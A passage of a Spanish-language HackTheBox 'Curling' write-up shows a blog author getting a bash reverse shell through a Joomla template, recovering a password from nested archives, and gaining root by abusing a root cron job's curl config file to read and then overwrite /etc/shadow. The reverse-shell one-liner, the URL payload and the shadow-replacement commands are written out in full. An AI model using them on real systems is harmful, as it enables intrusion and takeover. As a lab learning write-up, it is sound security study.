+<p>Nos ponemos en escucha:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<p>Generamos nuestro payload (lo que ejecutara el sistema) y lo encodeamos en <strong>base64</strong>:</p>
+
+<pre><code class="language-bash">❱ echo "bash -i &gt;&amp; /dev/tcp/10.10.14.5/4433 0&gt;&amp;1" | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MzMgMD4mMQo=
+</code></pre>
+
+<p>Una vez la petición sea recibida en nuestro puerto <code>4433</code> se generará una <code>/bin/bash</code>.</p>
+
+<p>Ahora <strong>URLencodeamos</strong> para evitar que <code>+</code> o <code>=</code> sean interpretados de manera errónea por la web, usaremos <a href="https://www.urlencoder.org/">esta web</a>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160google_URLencode_revSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y lo que haremos para que el sistema entienda lo que le enviamos y lo interprete será:</p>
+
+<pre><code class="language-html">http://10.10.10.150/templates/beez3/error.php?xmd=echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MzMgMD4mMQo%3D | base64 -d | bash
+</code></pre>
+
+<p>Lanzamos la petición y en nuestro listeneeeeeeeeeeeeeer:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>TAMO DENTROOROROWOWOWOWOWOWOOWOW!!</p>
+
+<p>…</p>
+
+<p>He creado un script para automatizar la modificación del template y obtener ejecución remota de comandos desde él, se los dejo por si algo (con él no es necesario <strong>URLencodear</strong> nada):</p>
+
+<p>🔢 <a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/curling/joomlArce.py"><strong><em>joomlArce.py</em></strong></a></p>
+
+<p>…</p>
+
+<p>Antes de seguir hagamos un tratamiento de la <strong>TTY</strong>, esto para que nuestra Shell sea completamente interactiva, nos permita ejecutar <code>Ctrl+C</code>, tener histórico de comandos y movernos entre ellos.</p>
+
+<ul>
+  <li><a href="https://lanzt.gitbook.io/cheatsheet-pentest/tty">https://lanzt.gitbook.io/cheatsheet-pentest/tty</a>.</li>
+</ul>
+
+<p>Ahora si sigamos…</p>
+
+<p>…</p>
+
+<h1 id="backupassword-floris">backup_password: www-data -&gt; floris <a href="#backupassword-floris">#</a></h1>
+
+<p>Enumerando los directorios desde que obtenemos la reverse Shell hacia atrás vemos uno llamativo ¿lo ves?:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_lsLA_configurationPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Un objeto con nombre <code>configuration.php</code> nos dice “investígame”, así que hagámosle caso:</p>
+
+<p>(Es muy grande 😏)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_configurationPHP_creds.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Entre todo lo que hay detallamos dos contraseñas, <code>$password</code> y <code>$secret</code>. Una de ellas es para el servicio <code>MySQL</code> y el usuario <code>floris</code>, si las probamos si nos permiten entrar al servicio <code>MySQL</code>, pero no encontramos nada útil en él :( e intentando reutilización de contraseñas tampoco obtenemos nada…</p>
+
+<p>Enumerando el sistema, encontramos un dos archivos llamativos en el <code>/home</code> de <strong>floris</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_lsLA_home.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<ul>
+  <li>El directorio <code>admin-area</code>, pero no tenemos acceso a él aún.</li>
+  <li>Por el contrario si tenemos acceso al objeto <code>password_backup</code>.</li>
+</ul>
+
+<hr />
+
+<h2 id="password-decompress">Descomprimiendo el comprimido del comprimido <a href="#password-decompress">📌</a></h2>
+
+<p>Veamos el backup…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_catBackupPassword.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>El resultado de un dumpeo <code>hexadecimal</code> contra un objeto, pero ¿cómo sabemos que es de un objeto?, bueno, investigando existe una herramienta con la que podemos (entre muuuchas cosas) -revertir- ese contenido <strong>hexadecimal</strong> al original.</p>
+
+<ul>
+  <li><a href="https://www.tutorialspoint.com/unix_commands/xxd.htm">xxd - Unix, Linux Command</a></li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160google_xxd_revert.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Pues intentémoslo y guardemos el resultado en un archivo:</p>
+
+<pre><code class="language-bash">www-data@curling:/home/floris$ xxd -r password_backup &gt; /tmp/file_reverse
+</code></pre>
+
+<p>Y si validamos el archivo resultante vemos el tipo de archivo original:</p>
+
+<pre><code class="language-bash">www-data@curling:/tmp$ file file_reverse 
+file_reverse: bzip2 compressed data, block size = 900k
+</code></pre>
+
+<p>Un comprimido <a href="https://es.wikipedia.org/wiki/Bzip2">bzip2</a>, pues démosle el nombre de archivo necesario e intentemos descomprimirlo:</p>
+
+<p>(<strong><em>Al ser poquitas veces las que debemos descomprimir el archivo, aprovecho para mostrarles el paso a paso</em></strong>)</p>
+
+<pre><code class="language-bash">www-data@curling:/tmp$ mv file_reverse file_reverse.bz2
+www-data@curling:/tmp$ bzip2 -d file_reverse.bz2
+</code></pre>
+
+<p>Y como resultado tenemos un nuevo objeto:</p>
+
+<pre><code class="language-bash">www-data@curling:/tmp$ file file_reverse 
+file_reverse: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix
+</code></pre>
+
+<p>Ahora tenemos un objeto comprimido con <a href="https://www.ochobitshacenunbyte.com/2019/09/19/comandos-gzip-y-gunzip-en-gnu-linux/">gzip</a>, descomprimámoslo:</p>
+
+<pre><code class="language-bash">www-data@curling:/tmp$ mv file_reverse file_reverse.gz
+www-data@curling:/tmp$ gzip -d file_reverse.gz
+</code></pre>
+
+<p>Y obtenemos un nuevo <code>bzip2</code>:</p>
+
+<pre><code class="language-bash">www-data@curling:/tmp$ file file_reverse 
+file_reverse: bzip2 compressed data, block size = 900k
+</code></pre>
+
+<p>Volvemos a descomprimirlo:</p>
+
+<pre><code class="language-bash">www-data@curling:/tmp$ mv file_reverse file_reverse.bz2  
+www-data@curling:/tmp$ bzip2 -d file_reverse.bz2
+</code></pre>
+
+<p>Y como resultado ahora obtenemos:</p>
+
+<pre><code class="language-bash">www-data@curling:/tmp$ file file_reverse 
+file_reverse: POSIX tar archive (GNU)
+</code></pre>
+
+<p>Un objeto <a href="https://www.howtogeek.com/248780/how-to-compress-and-extract-files-using-the-tar-command-on-linux/">tar</a>, descomprimámoslo:</p>
+
+<pre><code class="language-bash">www-data@curling:/tmp$ mv file_reverse file_reverse.tar.gz
+www-data@curling:/tmp$ tar -xvf file_reverse.tar.gz 
+password.txt
+</code></pre>
+
+<p>Nos devuelve el objeto <code>password.txt</code> y ese si parece ser un archivo de texto, validemos:</p>
+
+<pre><code class="language-bash">www-data@curling:/tmp$ file password.txt 
+password.txt: ASCII text
+</code></pre>
+
+<p>Pos si, si vemos su contenido encontramos una cadena que si tiene toda la pinta de ser una credencial:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_wwwdataSH_passwordTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Pues si la validamos ya sea con <code>su floris</code> o ejecutando en otra terminal <code>ssh floris@10.10.10.150</code>, vamos a obtener lo mismo, una <strong>sesión en el sistema como <code>floris</code></strong>:</p>
+
+<pre><code class="language-bash">❱ ssh floris@10.10.10.150
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_ssh_florisSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>PEEEERRRFECCCTOOOO!!</p>
+
+<p>…</p>
+
+<p>Cree un script en <code>bash</code> que va a moverse entre toooooodos los archivos modificando sus nombres y efectuando la dezcomprimhisazion:</p>
+
+<p>🔢 <a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/curling/brutopress.sh">brutopress.sh</a></p>
+
+<p>…</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h1>
+
+<p>Si recordamos había una carpeta bastante llamativa en el <code>/home</code> de <strong>floris</strong>:</p>
+
+<pre><code class="language-bash">floris@curling:~$ ls
+admin-area  password_backup  user.txt
+</code></pre>
+
+<p>Veamos que hay en ella:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_lsLA_HomeAdminPanel.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Jmmmm, si nos fijamos son archivos actuales y que tienen la misma hora-fecha de creación/modificación, YYYYY al estar en el grupo <code>floris</code> tenemos acceso a modificarlos y leerlos, curioso, bastante curioso…</p>
+
+<p>Revisando el contenido de cada uno tenemos:</p>
+
+<pre><code class="language-bash">floris@curling:~/admin-area$ cat input 
+url = "http://127.0.0.1"
+</code></pre>
+
+<pre><code class="language-html">floris@curling:~/admin-area$ cat report
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en-gb" dir="ltr"&gt;
+&lt;head&gt;
+        &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;
+        &lt;meta charset="utf-8" /&gt;
+        &lt;base href="http://127.0.0.1/" /&gt;
+        &lt;meta name="description" content="best curling site on the planet!" /&gt;
+        &lt;meta name="generator" content="Joomla! - Open Source Content Management" /&gt;
+        &lt;title&gt;Home&lt;/title&gt;
+        ...
+...
+</code></pre>
+
+<p>El objeto <code>report</code> tiene el mismo código <strong>HTML</strong> que si hacemos una petición hacia el recurso <code>http://10.10.10.150</code>, con lo cual sabemos que internamente también esta siendo ejecutado el <strong>CMS</strong> <code>Joomla</code>…</p>
+
+<p>Sin entender muy bien que hacer me puse a enumerar que instrucciones o acciones están siendo ejecutadas de manera -automatizada- en el sistema.</p>
+
+<p>Existen varios métodos, pero hay una herramienta llamada <a href="https://github.com/DominicBreuker/pspy">pspy</a> que hace un recorrido por el sistema buscando tareas que se estén ejecutando.</p>
+
+<p>Descargamos el binario de <a href="https://github.com/DominicBreuker/pspy/releases">acá</a> y lo subimos a la máquina:</p>
+
+<pre><code class="language-bash"># Creamos entorno de trabajo
+floris@curling:/tmp$ mkdir miacosa
+floris@curling:/tmp$ cd miacosa/
+floris@curling:/tmp/miacosa$ curl http://10.10.14.5:8000/pspy -o pspy
+floris@curling:/tmp/miacosa$ file pspy 
+pspy: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
+</code></pre>
+
+<p>Listo, ahora lo ejecutamos:</p>
+
+<pre><code class="language-bash">floris@curling:/tmp/miacosa$ chmod +x pspy
+floris@curling:/tmp/miacosa$ ./pspy
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_pspy_FOUNDcurl.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>OPAAAAAAAAAa, existen dos instrucciones siendo ejecutadas por el usuario <code>root</code> (por el <strong>UID</strong> (user id), <strong><em>root</em></strong> siempre tiene asignado <code>0</code>), pero solo una nos llama la atención, ya que esta interactuando con los archivos <code>input</code> y <code>report</code>, los dos objetos que encontramos antes y que tenían fecha-hora igual. ¡Ahí esta la razón de eso!!</p>
+
+<p>Es ejecutada cada minuto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_pspy_FOUNDcurlEACHminute.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>La instrucción es sencilla:</p>
+
+<pre><code class="language-bash">/bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+</code></pre>
+
+<p>El parámetro <code>-K</code> toma un archivo de configuración, en su contenido van instrucciones que <code>cURL</code> interpretara, por ejemplo podemos pasarle <code>user-agent</code>, <code>url</code>, <code>output</code>, <code>-L</code> (para ver redirecciones), <a href="https://everything.curl.dev/cmdline/configfile">etc</a>. Todos los argumentos con los que ejecutamos <code>cURL</code> desde la terminal los podemos agregar en un archivo y pasárselo con el parámetro <code>-K</code>:</p>
+
+<p>⚙️ <code>-K, --config &lt;file&gt;</code></p>
+
+<ul>
+  <li>Specify a text file <strong>to read curl arguments from</strong>. <strong><em>The command line arguments found in the text file will be used as if they were provided on the command line</em></strong>.</li>
+</ul>
+
+<p>Como el único argumento actual en <code>input</code> es:</p>
+
+<pre><code class="language-bash">url = "http://127.0.0.1"
+</code></pre>
+
+<p>Esta haciendo una petición hacia esa <strong>URL</strong> (:</p>
+
+<p>Y simplemente el resultado de la consulta la guarda en <code>report</code> (con <code>-o</code>). Sencillito de entender. Ahora veamos como romper esoooooooooooooooooooowoweoriwqeru…</p>
+
+<p>…</p>
+
+<h2 id="breaking-curlfig">Jugando con el archivo que toma <u>cURL</u> como configuración <a href="#breaking-curlfig">📌</a></h2>
+
+<p>Intentando cositas como pasarle nuestra <strong>URL</strong> de algún servidor <code>Python</code>, recibimos la petición, pero claro, no tenemos posibilidad de indicarle que <strong>interprete</strong> lo que sea que tengamos sirviendo 😞</p>
+
+<p>Buscando y buscando llegamos a este recurso del siempre fiel <code>GTFOBins</code> (échenle un ojo, tiene muuuuuuuchas maneras de explotar muuuuuuuuuuchos binarios):</p>
+
+<ul>
+  <li><a href="https://gtfobins.github.io/gtfobins/curl/">https://gtfobins.github.io/gtfobins/curl/</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160google_gtfobins_curl_READfile.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Nos indica que si queremos leer archivos podemos usar <code>file://</code> seguido del archivo en cuestión… OPA, interesante, puees si la instrucción <code>cURL</code> la esta ejecutando <code>root</code> podemos ver archivos privilegiados, ¿no? Puuuuuues intentemos ver el archivo que contiene tooodas las contraseñas de los usuarios del sistema, el objeto <a href="https://searchsecurity.techtarget.com/definition/shadow-password-file">/etc/shadow</a>:</p>
+
+<p>Debemos modificar el archivo <code>input</code> con esto:</p>
+
+<pre><code class="language-bash">floris@curling:/tmp/miacosa$ echo 'url = "file:///etc/shadow"'
+url = "file:///etc/shadow"
+</code></pre>
+
+<p>Pues hagámoslo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_fileINPUT_originalETCshadow.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y si revisamos el archivo <code>report</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_florisSH_fileREPORT_originalETCshadow.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>¡Qué maravillaaaaaaaaaaaaaaaaaaaaaaaaaaa!!</p>
+
+<p>Con esto ya podríamos obtener la <code>flag</code> de <strong>root</strong>…</p>
+
+<hr />
+
+<h2 id="shadow-root">Cambiamos la contraseña de <u>root</u> para obtener una Shell en el sistema <a href="#shadow-root">📌</a></h2>
+
+<p>Probando maneras de obtener una <strong>Shell</strong> con simplemente una subida y modificación de archivos recorde una manera que interactuaba directamente con el archivo <code>/etc/shadow</code>, en internet encontramos este post con una explicación brutal:</p>
+
+<ul>
+  <li><a href="https://blog.geoda-security.com/2019/02/privilege-escalation-exploiting-write.html">Privilege Escalation: Exploiting write access to /etc/shadow</a>.</li>
+</ul>
+
+<p><strong>Visiten el post, esta muy bueno y explica muuuchas cosas que no tocaré acá.</strong></p>
+
+<p>(En pocas palabras)…</p>
+
+<p>Una credencial del archivo <code>/etc/shadow</code> normalmente tiene este formato:</p>
+
+<pre><code class="language-bash">test:x:1002:1002:test,,,:/test:/bin/bash
+</code></pre>
+
+<p>Donde de todos los campos (separados por <code>:</code>) el que contiene la contraseña en este ejemplo es <code>x</code>. Pero <strong>OJOOOOOOOOO</strong>, la contraseña no es <code>x</code> (por si no me hice entender) 🤪, donde esta la <code>x</code> va el hash de la contraseña…</p>
+
+<p>Entonces, la explotación se basa en <strong>remplazar</strong> el <code>hash</code> (la contraseña) de algún usuario con uno nuevo queeeeee haga referencia a una contraseña que conozcamos (obvio :P).</p>
+
+<p>Esto para iniciar sesión con esa nueva contraseña contra el usuario al que le cambiamos su <code>hash</code> (contraseña).</p>
+
+<p>Veámoslo en la práctica.</p>
+
+<p>Tomamos el contenido original del archivo <code>/etc/shadow</code>. Aprovechemos el archivo de configuración para indicarle que nos guarde el resultado de la petición en otro archivo:</p>
+
+<pre><code class="language-bash">floris@curling:/tmp/miacosa$ echo -e 'url = "file:///etc/shadow"\n-o /tmp/miacosa/shasha'
+url = "file:///etc/shadow"
+-o /tmp/miacosa/shasha
+</code></pre>
+
+<pre><code class="language-bash">floris@curling:/tmp/miacosa$ echo -e 'url = "file:///etc/shadow"\n-o /tmp/miacosa/shasha' &gt; /home/floris/admin-area/input
+</code></pre>
+
+<p>Esperamos un momento y ya tendríamos el archivo <code>shasha</code> en nuestra carpeta de trabajo, (de todas las formas en que podemos pasarnos el archivo) tomamos su contenido, nos lo llevamos a nuestra máquina y generamos un nuevo archivo con él:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_transport_ORIGINALshadowFILE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y ahora nos queda identificar que tipo de hash tiene el usuario <code>root</code> para así mismo generar el nuestro con el formato correcto:</p>
+
+<pre><code class="language-bash">root:$6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7/Nv8oje0c.bljjnn6FMF1:17673:0:99999:7:::
+...
+</code></pre>
+
+<p>En el mismo post nos indica:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160google_shadow_typeHASH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Así que el algoritmo usado es <code>SHA-512</code>, encontramos estas maneras de generarlos desde consola:</p>
+
+<ul>
+  <li><a href="https://rakeshjain-devops.medium.com/how-to-create-sha512-sha256-md5-password-hashes-on-command-line-2223db20c08c">How to create SHA512/SHA256/MD5 password hashes on command line</a>.</li>
+  <li><a href="https://unix.stackexchange.com/questions/52108/how-to-create-sha512-password-hashes-on-command-line#answer-76337">How to create SHA512 password hashes on command line</a>.</li>
+</ul>
+
+<p>Nos quedaremos con esta manera:</p>
+
+<pre><code class="language-bash">❱ python3 -c 'import crypt; print(crypt.crypt("hola", crypt.mksalt(crypt.METHOD_SHA512)))'
+</code></pre>
+
+<p>Donde <code>hola</code> es la “contraseña” que queremos encriptar, pues generemos el hash para <code>ajatepille</code>:</p>
+
+<pre><code class="language-bash">❱ python3 -c 'import crypt; print(crypt.crypt("ajatepille", crypt.mksalt(crypt.METHOD_SHA512)))'
+$6$4iWM54cNAlfhQmjI$ZXyO9QTKqY0iXUwcliHzZ.o8LjNyj.l9ZS6iw0gv7hj1vuUp2LwBykBkE2GFjsvggl2CA4HQInUCVYap6WznA0
+</code></pre>
+
+<p>Perfectísimo, lo siguiente será remplazar la contraseña de <code>root</code> por la nueva:</p>
+
+<pre><code class="language-bash">root:$6$4iWM54cNAlfhQmjI$ZXyO9QTKqY0iXUwcliHzZ.o8LjNyj.l9ZS6iw0gv7hj1vuUp2LwBykBkE2GFjsvggl2CA4HQInUCVYap6WznA0:17673:0:99999:7:::
+...
+</code></pre>
+
+<p>Y como paso final debemos indicarle a la instrucción <code>cURL</code> que tome ese contenido y lo remplacé por el actual:</p>
+
+<p>(<strong>Levantamos un servidor web en la ruta donde esté el archivo <code>shadow</code></strong>)</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+</code></pre>
+
+<p>Y en el objeto <code>input</code> indicamos:</p>
+
+<pre><code class="language-bash">floris@curling:/tmp/miacosa$ echo -e 'url = "http://10.10.14.5:8000/shadow"\n-o /etc/shadow'
+url = "http://10.10.14.5:8000/shadow"
+-o /etc/shadow
+</code></pre>
+
+<pre><code class="language-bash">floris@curling:/tmp/miacosa$ echo -e 'url = "http://10.10.14.5:8000/shadow"\n-o /etc/shadow' &gt; /home/floris/admin-area/input 
+</code></pre>
+
+<p>Nos llegara la petición, leerá el contenido del archivo hosteado (<code>shadow</code>) y lo guardara en la ruta <code>/etc/shadow</code>, o sea, el nuevo archivo será el que contiene nuestra contraseña (:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_transport_FAKEshadowFILE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>YyyyyyyyyyyyYYYyyyYyyy si ahora intentamos conectarnos como <code>root</code> con la contraseña <code>ajatepille</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_rootSH_su.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>VAMOOOOOOOOOOOOOOONOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOS!! Conseguimos una <strong>Shell</strong> como el usuario <code>root</code> cambiándole su contraseña, que belleza!!</p>
+
+<p>Veamos las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y eso es todo por esta máquina :(:(:(:(:</p>
+
+<p>…</p>
+
+<p>Bonito camino, lo de encontrar <code>secret.txt</code> así como así en un comentario fue muy KLK, pero de resto fue de mucho aprendizaje.</p>
+
+<p>Y weno, nos reencontraremos en otra ocasión, a darle duro a todo yyyyyyyyyyyyyyyyyyy a seguir rompiendoOOO0oOOOOOOoooooTODOOOOOOOOooooOO!!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Curling&url=http://localhost:4000/htb/curling" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#/etc/shadow">/etc/shadow</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#backup">backup</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cURL-config-file">cURL-config-file</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#joomla">joomla</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/bastion">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186banner.png" alt="HackTheBox - Bastion"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/bastion">HackTheBox - Bastion</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil. Nos moveremos con Samba, jugaremos con el backup de una máquina virtual Windows para extraer los archivos SAM y SYSTEM… Crackearemos cosillas y nos daremos cuenta...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">08 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/enterprise">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112banner.png" alt="HackTheBox - Enterprise"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/enterprise">HackTheBox - Enterprise</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio, vamos a movernos entre sentencias SQL para generar pinchazos e.e Pivotearemos entre contenedores y compartiremos experiencias con el host… Finalmente explotaremos un buffer overflow mediante un...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">10 May 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
